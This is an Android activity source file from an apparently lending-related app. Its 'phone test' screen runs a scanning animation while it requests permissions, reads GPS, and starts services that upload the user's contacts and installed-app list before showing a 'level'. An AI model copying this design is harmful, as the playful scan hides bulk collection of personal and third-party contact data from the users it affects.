package com.jike.cashocean.ui.find;

import android.Manifest;
import android.content.Intent;
import android.location.Location;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.animation.LinearInterpolator;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;

import com.blankj.utilcode.util.LogUtils;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;
import com.jike.cashocean.R;
import com.jike.cashocean.model.UserLevelBean;
import com.jike.cashocean.service.GetAppListService;
import com.jike.cashocean.service.UserContactService;
import com.jike.cashocean.ui.base.BaseActivity;
import com.jike.cashocean.ui.find.compoment.DaggerFindComponent;
import com.jike.cashocean.ui.find.contract.PhoneTestContract;
import com.jike.cashocean.ui.find.module.FindModule;
import com.jike.cashocean.ui.find.presenter.PhoneTestPresenter;
import com.tbruyelle.rxpermissions2.RxPermissions;

import butterknife.BindView;

public class PhoneTestActivity extends BaseActivity<PhoneTestPresenter> implements PhoneTestContract.View {


    @BindView(R.id.ibn_back)
    ImageButton ibnBack;
    @BindView(R.id.tv_title)
    TextView tvTitle;
    @BindView(R.id.tv_title_right)
    TextView tvTitleRight;
    @BindView(R.id.iv_saomiao)
    ImageView ivSaomiao;
    @BindView(R.id.tv_hint)
    TextView tvHint;
    @BindView(R.id.rl_saomiao)
    RelativeLayout rlSaomiao;

    @Override
    public int getContentLayout() {
        return R.layout.activity_phone_test;
    }

    @Override
    public void initInjector() {
        DaggerFindComponent.builder().findModule(new FindModule("手机测评", this)).build().inject(this);
    }

    Animation animation;

    @Override
    public void bindView(View view, Bundle sacedInstanceState) {
        tvTitle.setText(getString(R.string.phone_test_page));
        ibnBack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                finish();
            }
        });


        animation = AnimationUtils.loadAnimation(this, R.anim.icon_zhuan);
        LinearInterpolator lin = new LinearInterpolator();
        animation.setInterpolator(lin);
//        ivSaomiao.setAnimation(animation);

        tvHint.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tvHint.setVisibility(View.GONE);
                ivSaomiao.setAnimation(animation);
                ivSaomiao.setImageResource(R.mipmap.icon_saomiao);
                animation.start();
                startUploadPhoneInfo();
            }
        });
    }

    FusedLocationProviderClient fusedLocationClient;
    private String gps = "";
    private boolean isCanQuite = true;

    private void startUploadPhoneInfo() {
        isCanQuite = false;
        //地址
        fusedLocationClient =
                LocationServices.getFusedLocationProviderClient(this);
        new RxPermissions(this)
                .request(Manifest.permission.ACCESS_COARSE_LOCATION)
                .subscribe(bool -> {
                    if (bool) {
                        fusedLocationClient.getLastLocation()
                                .addOnSuccessListener(this, new OnSuccessListener<Location>() {
                                    @Override
                                    public void onSuccess(Location location) {
                                        // Got last known location. In some rare situations this can
                                        // be null.
                                        if (location != null) {
                                            // Logic to handle location object
                                            gps = location.getLongitude() + "," + location.getLatitude();

                                            LogUtils.e("gps:" + gps);
                                        }
                                    }
                                });
                    } else {
                    }
                });

        handler.sendEmptyMessageDelayed(1, 1000);
    }

    //提交通讯录
    public void upLoadContact() {
        new RxPermissions(this)
                .request(Manifest.permission.READ_CONTACTS)
                .subscribe(boole -> {
                    if (boole) {
                        Intent intent = new Intent(PhoneTestActivity.this,
                                UserContactService.class);
                        startService(intent);
                    } else {
                        LogUtils.e("通讯录失败");
                    }
                    handler.sendEmptyMessageDelayed(2, 1500);
                });
    }

    //提交app列表
    public void upLoadAppList() {
        Intent intent = new Intent(PhoneTestActivity.this, GetAppListService.class);
        startService(intent);
    }

    //

    String imei = "";

    @Override
    public void initData() {
        fusedLocationClient =
                LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public void onReloadClick(View v) {

    }

    @Override
    public boolean needUserLoadSir() {
        return false;
    }

    Handler handler = new Handler() {
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case 1:
                    upLoadContact();
                    break;
                case 2:
                    upLoadAppList();
                    handler.sendEmptyMessageDelayed(3, 1500);
                    break;
                case 3:
                    mPresenter.upLoadPhoneInfo(imei, gps);
                    break;
                default:
                    break;
            }
//            mPresenter.upLoadPhoneInfo(imei, gps);
        }
    };

    @Override
    public void jumpInfo(UserLevelBean userLevelBean) {
        tvHint.setVisibility(View.VISIBLE);
        Intent intent = new Intent(PhoneTestActivity.this, PhoneTestResultActivity.class);
        intent.putExtra("level", userLevelBean.getData().getDatas().getLevel());
        startActivity(intent);
        if (ivSaomiao.getAnimation() != null) {
            ivSaomiao.clearAnimation();
        }
        ivSaomiao.setImageResource(R.mipmap.icon_saomiao_1);
        isCanQuite = true;
        finish();
    }
}
